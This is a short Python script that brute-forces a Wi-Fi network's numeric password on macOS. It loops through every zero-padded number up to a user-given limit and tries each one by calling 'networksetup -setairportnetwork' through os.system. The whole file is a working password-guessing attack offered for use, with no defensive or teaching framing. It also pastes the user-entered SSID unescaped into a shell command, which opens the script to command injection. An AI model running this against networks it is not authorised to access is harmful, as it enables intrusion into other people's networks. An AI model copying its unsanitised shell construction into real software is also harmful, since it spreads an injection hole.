import os

ssid = input('Enter the ssid: ')
#password = input('Enter the password: ')
n = input('Enter number of digits: ')
largest_combination = input('Enter the largest combination: ')
for i in range(int(largest_combination)):
    password = i + 1
    password = str(password)
    while True:
        if len(password) < int(n):
            password = '0' + password
        else:
            break
    print(password)
    try:
        command = 'networksetup -setairportnetwork en0 ' + ssid + ' ' + password
        os.system(command)
    except:
        continue
